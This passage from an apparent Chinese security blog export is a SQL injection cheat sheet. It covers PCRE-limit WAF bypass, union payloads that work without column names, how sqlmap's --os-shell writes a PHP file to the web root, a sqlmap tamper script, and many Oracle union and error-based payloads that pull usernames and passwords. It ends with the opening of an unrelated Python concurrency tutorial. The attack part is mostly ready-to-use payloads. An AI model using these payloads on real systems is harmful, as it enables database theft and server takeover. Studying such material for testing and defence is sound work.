<h2 id="PCRE绕过"><a href="#PCRE绕过" class="headerlink" title="PCRE绕过"></a>PCRE绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PHP 的 pcre.backtrack_limit 限制利用</span><br><span class="line"><span class="keyword">union</span><span class="comment">/*aaaaaaaxN*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure>

<p><font color="red"> 上面的还不行就尝试修改语句逻辑再绕过试试</font> </p>
<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a><center>无列名注入</center></h1><p>遇到information_schema.tables被过滤、转义、删除的情况下使用</p>
<p>Payload</p>
<p>猜表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>猜数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)/**/as/**/b),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>

<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a><center>Sqlmap</center></h1><h2 id="–os-shell的原理"><a href="#–os-shell的原理" class="headerlink" title="–os-shell的原理"></a>–os-shell的原理</h2><ul>
<li>使用条件<ol>
<li>网站必须是root权限</li>
<li>攻击者需要知道网站的绝对路径</li>
<li>GPC为off，php主动转义的功能关闭</li>
</ol>
</li>
</ul>
<p>用into outfile函数将一个可以用来上传的php文件写到网站的根目录下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownunsKjTko6QxSAY3.png"></p>
<p>也就是上传一个功能马</p>
<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##此处用法为：程序到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多行注释符，此处为三个双引号，因为是其中也有单引号，并且该说明为一般文档说明，故用三个双引号</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re   <span class="comment">#导入python中的re 字符替换包，方便下面的字符替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb <span class="comment">#导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kb</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY  <span class="comment">#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py</span></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL <span class="comment">#定义优先级，此处为级别为【一般】</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():  <span class="comment">#定义dependencies():此处是为了和整体脚本的结构保持一致。</span></span><br><span class="line">    <span class="keyword">pass</span>   <span class="comment">#pass 不做任何事情，一般用做占位语句。为了保持程序结构的完整性。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):  <span class="comment">#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;&#x27;a&#x27;: 1, &#x27;c&#x27;: 3, &#x27;b&#x27;: 2&#125; </span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%0a&quot;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;like&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="增加新的Payload"><a href="#增加新的Payload" class="headerlink" title="增加新的Payload"></a>增加新的Payload</h2><p>目录在<code>./data/xml/payload</code></p>
<p>可以看到6个xml文件</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowncjM2FqdQuzpoN9C.png"></p>
<p>拿<code>boolean_blind.xml文件</code>里面的一部分来分析</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">title</span>&gt;</span>SAP MaxDB boolean-based blind - Stacked queries<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">stype</span>&gt;</span>1<span class="tag">&lt;/<span class="name">stype</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">level</span>&gt;</span>5<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">risk</span>&gt;</span>1<span class="tag">&lt;/<span class="name">risk</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">clause</span>&gt;</span>1-8<span class="tag">&lt;/<span class="name">clause</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">where</span>&gt;</span>1<span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">vector</span>&gt;</span>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">payload</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">payload</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comment</span>&gt;</span>--<span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comparison</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">comparison</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">details</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">dbms</span>&gt;</span>SAP MaxDB<span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>title<br>  title属性为当前测试Payload的标题，通过标题就可以了解当前的注入手法与测试的数据库类型。</p>
</li>
<li><p>stype<br>  查询类型。</p>
</li>
<li><p>level<br>  风险等级(1-5,默认1)。</p>
</li>
<li><p>risk<br>  危险等级(1-3,默认1)。</p>
</li>
<li><p>clause<br>  指定为每个payload使用的SQL查询从句。</p>
<p>  <img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown7Ftj9qHuXD1zeUV.png"></p>
</li>
<li><p>where<br>  与上图一致。</p>
</li>
<li><p>vector<br>  指定将使用的注入模版。</p>
</li>
<li><p>payload<br>  测试使用的payload ,[RANDNUM]，[DELIMITER_START]，[DELIMITER_STOP]分别代表着随机数值与字符。当SQLMap扫描时会把对应的随机数替换掉,然后再与boundary的前缀与后缀拼接起来,最终成为测试的Payload。</p>
</li>
<li><p>common<br>  payload 之后，boundary 拼接的后缀suffix之前。</p>
</li>
<li><p>char<br>  在union 查询中爆破列时所用的字符。</p>
</li>
<li><p>columns<br>  联合查询测试的列数范围。</p>
</li>
<li><p>response<br>  根据回显辨别这次注入的payload是否成功。</p>
</li>
<li><p>comparison<br>  使用字符串作为payload执行请求，将响应和负载响应进行对比，在基于布尔值的盲注中有效。</p>
</li>
<li><p>grep<br>  使用正则表达式去批结响应，判断时候注入成功，在基于错误的注入中有用。</p>
</li>
<li><p>time<br>  在基于time的注入中等待结果返回的所需要的时间</p>
</li>
<li><p>detail<br>  下设三个子节点</p>
</li>
</ul>
<p>最终的payload为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">where</span> <span class="operator">+</span> boundary.prefix<span class="operator">+</span>test.payload <span class="operator">+</span> test.common <span class="operator">+</span> <span class="operator">+</span>boundary.suffix</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQLInject</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle注入</title>
    <url>/-SQLInject/Oracle/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打JAVA站一般数据库都是Oracle，有一些特点的原因，所以特别记录一下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownWynZ1puLEAxdOHl.png"></p>
<span id="more"></span>

<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;def&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;users_abcdef&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>username_gugofj,<span class="operator">+</span>password_wvqepc<span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users_lsnuvu<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<ul>
<li>数据库</li>
<li>表<br>  USERS_TPHDTZ</li>
<li>列<br>  PASSWORD_AGKTIJ<br>  USERNAME_UTZPGF</li>
<li>字段</li>
</ul>
<h1 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Mysql是中小型数据库，而Oracle是<strong>大型数据库</strong>。</p>
<p>在注入时Oracle数据库与MySQL数据库是有区别的。</p>
<h2 id="2、oracle数据库权限分为2类"><a href="#2、oracle数据库权限分为2类" class="headerlink" title="2、oracle数据库权限分为2类"></a>2、oracle数据库权限分为2类</h2><p>注释符：<code>--</code></p>
<p><strong>dba</strong>拥有全部权限，数据库<code>最高权限</code>，只有dba才可以创建数据库结构</p>
<p><strong>oracle数据库自带的dual表，只有一行一列，每个用户都可以使用</strong></p>
<p>dual表可能被删掉，sys可以恢复</p>
<h3 id="2-1-、dual表"><a href="#2-1-、dual表" class="headerlink" title="2.1 、dual表"></a>2.1 、dual表</h3><p>dual是一个<code>虚拟表</code>，用来构成select的语法规则，<strong>oracle保证dual里面永远只有一条记录</strong>。我们可以用它来做很多事情。</p>
<h2 id="3、判断是否为oracle数据库"><a href="#3、判断是否为oracle数据库" class="headerlink" title="3、判断是否为oracle数据库"></a>3、判断是否为oracle数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dual)</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> user_tables)<span class="operator">&gt;</span><span class="number">0</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h2 id="4、dual表实现联合注入"><a href="#4、dual表实现联合注入" class="headerlink" title="4、dual表实现联合注入"></a>4、dual表实现联合注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n <span class="comment">--</span></span><br></pre></td></tr></table></figure>


<p><strong>强类型</strong>，字符类型需要对上，这里可以<strong>使用null代替无法猜测的数据类型</strong>位置如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h3 id="4-1、查库"><a href="#4-1、查库" class="headerlink" title="4.1、查库"></a>4.1、查库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">-- </span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个数据库&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;第一个数据库&#x27;</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;第二个数据库&#x27;</span>``),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="operator">-</span></span><br></pre></td></tr></table></figure>




<h3 id="4-2、查表"><a href="#4-2、查表" class="headerlink" title="4.2、查表"></a>4.2、查表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个表名&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h3 id="4-3、字段"><a href="#4-3、字段" class="headerlink" title="4.3、字段"></a>4.3、字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span>``<span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> column_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个字段&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>读取数据：字段名需要用<strong>双引号括起来！！</strong>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;字段名&quot;<span class="operator">||</span><span class="operator">-</span><span class="operator">||</span>&quot;字段名&quot;, <span class="keyword">from</span> 表名 <span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5、dual表实现报错注入"><a href="#5、dual表实现报错注入" class="headerlink" title="5、dual表实现报错注入"></a>5、dual表实现报错注入</h2><p>dbms_xdb_version.checkin()函数：获取当前用户名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>




<p>dbms_xdb_versionuncheckout()函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dbms_xdb_versionuncheckout(<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>




<p><code>utl_inaddr.get_host_name()函数</code> 8g,9g,10g,版本中不需要任何权限，11g及以后的版本需要网络访问权限</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> utl.inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>dbms_xdb_version.makeversioned()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>dbms_utility.sqlid_to_sqlhash()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_utility.sqlid_to_sqlhash(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">in</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>ordsys.ord_dicom.getmappingxpath()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ordsys.ord_dicom.getmappingxpath((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="keyword">user</span>,<span class="keyword">user</span>)<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>ctxsys.drithsx.sn()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h2 id="6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用"><a href="#6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用" class="headerlink" title="6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用"></a>6、假如<code>Oracle数据库</code>中没有dual表也无法进行恢复的情况下用</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tab_columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;USERS_TPHDTZ&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+USERNAME_UTZPGF,+PASSWORD_AGKTIJ+FROM+USERS_TPHDTZ--</span></span><br></pre></td></tr></table></figure>






<p><code>&#39;</code>报错，<code>&#39;&#39;</code>显示正常</p>
<p>返回错误时，确认是Oracle数据库且</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM not-a-real-table)||&#x27;</span></span><br></pre></td></tr></table></figure>


<p>此数据库需要显式指定表明</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM dual)||&#x27;</span></span><br></pre></td></tr></table></figure>




<h2 id="7、其他payload总结"><a href="#7、其他payload总结" class="headerlink" title="7、其他payload总结"></a>7、其他payload总结</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,null..... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<p><strong>判断第n个字段的类型，依次类推即可</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,null...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,<span class="string">&#x27;null&#x27;</span>...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> owner, table_name <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> ‘blah’</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> ‘blah’ <span class="keyword">and</span> owner <span class="operator">=</span> ‘foo’</span><br></pre></td></tr></table></figure>

<h1 id="JAVA中的注入"><a href="#JAVA中的注入" class="headerlink" title="JAVA中的注入"></a>JAVA中的注入</h1><p>伪代码方便白盒挖掘，当然黑盒也可以拿来判断一下。</p>
<table>
<thead>
<tr>
<th>种类</th>
<th>解释</th>
<th>伪代码</th>
</tr>
</thead>
<tbody><tr>
<td>String Source</td>
<td>输入点是字符串类型</td>
<td><code>one(@RequestParam(value = &quot;username&quot;) String username)</code></td>
</tr>
<tr>
<td>List<Long></td>
<td>输入点是Long泛型(用来测试误报)</td>
<td><code>longin(@RequestBody List&lt;Long&gt; user_list)</code></td>
</tr>
<tr>
<td>Optional<String></td>
<td>新特性</td>
<td><code>optionalLike(@RequestParam(value = &quot;username&quot;) Optional&lt;String&gt; optinal_username)</code></td>
</tr>
<tr>
<td>List<String> Source</td>
<td>输入点是String泛型</td>
<td><code>in(@RequestBody List&lt;String&gt; user_list)</code></td>
</tr>
<tr>
<td>Object Source</td>
<td>对象类型</td>
<td><code>objectParam(@RequestBody Student user)</code></td>
</tr>
<tr>
<td>MyBatis注入</td>
<td>XML分离SQL检测</td>
<td><code>myBatis(@RequestParam(value = &quot;name&quot;) String name)</code></td>
</tr>
<tr>
<td>In类型注入</td>
<td>In类型注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Like类型</td>
<td>Like类型注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Lombok</td>
<td>Lombok对注入漏洞的影响</td>
<td>参照代码</td>
</tr>
<tr>
<td>MyBatis注解方式注入</td>
<td>MyBatis注解方式注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Spring Data JPA</td>
<td>JPA 方式</td>
<td>参照代码</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQLInject</tag>
      </tags>
  </entry>
  <entry>
    <title>多进程、进程池、异步大总结</title>
    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>经常写脚本与工具，越发感觉到速度的重要性！本文从基础开始，基于Python讲解，适合小白阅读，但需要一定代码功底。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownrxesbPFqSN2uTp3.jpg"></p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><center>正文</center></h1><p>在正式进入学习之前，先要了解一定的基础知识。</p>
<h2 id="1-1-阻塞"><a href="#1-1-阻塞" class="headerlink" title="1.1 阻塞"></a>1.1 阻塞</h2><ul>
<li>程序未得到所需计算资源时被挂起的状态。</li>
<li><strong>程序在等待某个操作完成期间，自身无法继续干别的事情，则称该程序在该操作上是阻塞的****。</strong></li>
<li>常见的阻塞形式有：<code>网络I/O阻塞</code>、<code>磁盘I/O阻塞</code>、<code>用户输入阻塞</code><strong>等</strong>。</li>
</ul>
<p>阻塞是无处不在的，包括CPU切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。（如果是多核CPU则正在执行上下文切换操作的核不可被利用）</p>
